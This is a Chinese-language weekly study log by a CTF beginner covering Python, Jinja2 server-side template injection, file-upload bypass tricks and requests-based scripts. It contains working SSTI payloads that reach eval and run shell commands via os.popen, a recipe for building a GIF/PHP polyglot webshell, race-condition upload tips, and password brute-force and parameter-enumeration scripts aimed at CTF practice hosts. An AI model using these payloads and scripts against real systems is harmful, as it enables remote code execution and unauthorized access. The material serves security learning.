# <font style="color:rgb(38, 38, 38);">完成事项</font>
+ python语言学习，目前学习到类
+ SSTI漏洞原理及利用
+ upload漏洞解题技巧
+ 初步学习用python写web脚本

# <font style="color:rgb(38, 38, 38);">下周待做事项</font>
+ 主要：沿着ctfHub的路径学习web基础
+ 学习php语言
+ 继续学习python语言

# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
### 一.SSTI漏洞原理及利用
>模板嵌入在前端代码中，读取用户传入数据并渲染。如果没有过滤非法数据，并且将数据像代码一样执行，就会产生SSTI漏洞。

1.ctf常见python模板:jinja2
 >判断方法：传入参数{{7*7}}和{{'7'*7}}，返回49和7777777

2.基本结构语法：
 ```jinja2
{{  }} 变量输出
{%  %} 控制语句，如循环和条件判断
#控制语句都有结束标志，如:{%endfor%}、{%endif%}
{#  #} 注释
```
3.常见特殊属性：
 - \_\_class__:查看对象的类
 - \_\_mro__:查看类的继承关系，父类靠右
 - \_\_subclasses__():查看类的全部子类
 - \_\_init__:初始化对象
 - \_\_globals__:查看该模块下的全局变量，函数等
 - \_\_builtins__ :由于globals中没有内置函数，需要通过该属性配合globals查看内置函数
 - \_\_base__/\_\_bases__:查看类的基类
 - \_\_import__:导入模块

4.利用思路：
模板的全部类都由一个基类继承而来，通过\_\_base\_\_属性可以找到基类，一般是class obj.，然后通过\_\_subclasses\_\_()方法可以找到所有子类，从而在里面找到存在漏洞的类（用列表下标表示）加以利用
5.常见payload：
```jinja2
{{().__class__.__base__.__subclasses__()[194].__init__.__globals__.__builtins__['eval']('__import__("os").popen("ls /").read()')}}
{#参数定义了一个元组，通过元组属性追溯到基类再拿到了全部子类，发现第195个存在eval执行#}
{#os是Python的一个标准库模块，可与系统进行交互，而os.popen创建了一个命令管道执行shell命令#}
#如果不知道哪个子类有漏洞，可以用循环遍历出来
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'eval' in x.__init__.__globals__['__builtins__']['eval'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()') }}
    {% endif %}
{% endfor %}
{#很好理解，defined来查看漏洞属性是否存在类中，这也是为什么用这个payload会有多个输出#}
```

>这里感觉只是做了个初步的了解，SSTI同样也有waf题，对于ctf题解时可以使用民间大佬的脚本FenJing构造payload

### 二.upload漏洞解题技巧
1. 二次渲染绕过
>上传的图片马可能会被后端二次渲染。但gif图片文件过大，所以会不完全渲染，可以通过gif图和php混合构造一个gif马(GIF89a)

关键词提示:imagecreatefrom...()
方法:cmd使用copy 正常gif.gif /b+木马.php /a 合成后的gif马.gif
>/b指以二进制处理文件，/a指以文本方式处理文件

2. 条件竞争
>上传文件后，服务器会对文件进行检查和处理，这个过程可能会有时间差，可以利用这个时间差进行攻击

标志:后端会利用unlink(),rename(),move_uploaded_file()等函数删掉或移动上传的文件

方法:通过在后缀名后添加空格，用burp对空格进行空字典爆破，模式选择continue indefinitely，发送多个上传请求从而赢得竞争

3. /.绕过

类似于%00绕过，只不过形式变为在路径后添加/.
### 三.python解题类脚本学习
>对于web方向的脚本，主要需要用到requests库进行http请求的发送和响应的获取

requests库里常用方法：
 - requests.get():发送get请求
 - requests.post():发送post请求
 - requests.head():获取响应头信息
  response指requests方法的返回值，需要提前定义，常用属性和方法有：
 - response.text:以字符串形式返回响应内容
 - response.content:以字节形式返回响应内容，主要用于图片等非文本内容
 - response.json():将响应内容解析为json格式
1. requests.get(url,params(get参数))，这里的params是一个字典类型：{'参数名':'参数值'}
>攻防世界新手题目ics-06
```python
import requests
url = 'http://61.147.171.103:63672/index.php'
index = requests.get(url,params={'id':1})
for param in range(2300,2334):
    params = {'id':param}
    response = requests.get(url,params=params)
    if len(response.text) != len(index.text):
        #比较响应内容长度，长度不同则说明参数正确
        print(f"骇入成功,参数是{param}")
    else:
        print('Error')
```
2. requests.post(url,data(post参数))，这里的data是一个字典类型：{'参数名':'参数值'}，可以传多个参数
>攻防世界新手题目weak_auth，可以写个简单的密码爆破脚本
```python
import requests
dict_file = "D:\\!files\\Front-end development\\python\\WEB\\password.txt"
with open(dict_file,'r',encoding='utf-8') as file:
    #dict_file要保存绝对路径
    content = file.readlines()
    bypass = [line.strip() for line in content]
    #读取字典txt，按每行读取并去掉换行符，存入列表
url = "http://61.147.171.35:55920/check.php"
for password in bypass:
    data = {'username':'admin','password':str(password)}
    #data表单形式传参
    response=requests.post(url,data=data)
    print(response.status_code)
    if "error" not in response.text:
        print(f"密码找到: {password}")
```
3. 自定义请求头:
requests.get的另一种用法，可以传headers参数，headers同样是一个字典类型：
```python
headers = {
    'User-Agent': 'Mozilla/5.0 (CTF Bot)',
    'X-Forwarded-For': '127.0.0.1',
    'Cookie': 'session=abc123',
    'Referer': 'http://ctf.example.com/'
}
response = requests.get('http://ctf.example.com/admin', headers=headers)
```

# <font style="color:rgb(38, 38, 38);">本周学习总结</font>
主要学习了python




